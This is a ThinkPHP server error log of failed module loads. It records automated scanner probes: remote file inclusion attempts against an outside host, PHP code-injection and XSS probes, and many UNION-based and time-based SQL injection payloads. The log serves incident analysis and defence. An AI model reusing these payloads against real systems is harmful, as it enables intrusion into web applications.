[ 2015-09-02T00:11:21+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-02T00:11:25+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-02T00:11:29+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-02T00:12:33+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-02T00:12:40+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-02T00:12:47+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-02T00:12:55+08:00 ] ERR: (ThinkException) 无法加载模块'"><scRipt>alert(98733)</sCript>
[ 2015-09-02T00:45:24+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-02T00:45:30+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-02T00:45:37+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-02T00:45:55+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-02T00:46:02+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-02T00:46:07+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-02T00:46:15+08:00 ] ERR: (ThinkException) 无法加载模块'"><scRipt>alert(98733)</sCript>
[ 2015-09-02T02:17:42+08:00 ] ERR: (ThinkException) 无法加载模块Nav,'),]]").)
[ 2015-09-02T02:17:45+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:45+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:46+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-02T02:17:46+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:47+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:47+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:48+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-02T02:17:48+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-02T02:17:49+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:50+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:50+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:51+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:51+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-02T02:17:52+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-02T02:17:52+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-02T02:17:53+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:53+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:54+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:54+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:55+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:55+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-02T02:17:56+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-02T02:17:57+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-02T02:17:57+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-02T02:17:58+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:58+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:59+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:17:59+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:00+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:00+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:01+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:01+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:02+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-02T02:18:02+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-02T02:18:03+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-02T02:18:04+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:04+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:05+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:05+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:06+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:06+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:07+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:07+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:08+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:09+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:09+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-02T02:18:10+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-02T02:18:10+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-02T02:18:11+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:12+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:12+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:13+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:13+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:14+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:15+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:15+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:16+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:17+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:17+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:18+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:18+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-02T02:18:19+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-02T02:18:20+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-02T02:18:20+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:21+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:22+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:22+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:23+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:23+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:24+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:25+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:26+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:26+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:27+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:27+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:28+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:29+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:29+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-02T02:18:30+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-02T02:18:31+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-02T02:18:31+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:32+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:33+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:33+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:34+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:35+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:35+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:36+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:37+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:37+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:38+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:39+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:39+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:40+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:40+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:41+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-02T02:18:42+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-02T02:18:42+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-02T02:18:43+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-02T02:18:44+08:00 ] ERR: (ThinkException) 无法加载模块Nav' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:44+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:45+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:46+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:46+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:47+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:47+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:48+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:49+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:49+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:50+08:00 ] ERR: (ThinkException) 无法加载模块Nav') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-02T02:18:51+08:00 ] ERR: (ThinkException) 无法加载模块Nav AND SLEEP(5)
[ 2015-09-02T02:18:51+08:00 ] ERR: (ThinkException) 无法加载模块Nav AND SLEEP(5) #
[ 2015-09-02T02:18:52+08:00 ] ERR: (ThinkException) 无法加载模块Nav; SELECT PG_SLEEP(5)--
[ 2015-09-02T02:18:52+08:00 ] ERR: (ThinkException) 无法加载模块Nav; SELECT SLEEP(5)-- 
[ 2015-09-02T02:18:53+08:00 ] ERR: (ThinkException) 无法加载模块Nav'; SELECT SLEEP(5)-- 
[ 2015-09-02T02:18:54+08:00 ] ERR: (ThinkException) 无法加载模块Nav) AND SLEEP(5) #
[ 2015-09-02T02:18:54+08:00 ] ERR: (ThinkException) 无法加载模块Nav WAITFOR DELAY '0:0:5'--
[ 2015-09-02T02:33:40+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-02T02:33:47+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-02T02:33:55+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-02T02:36:49+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
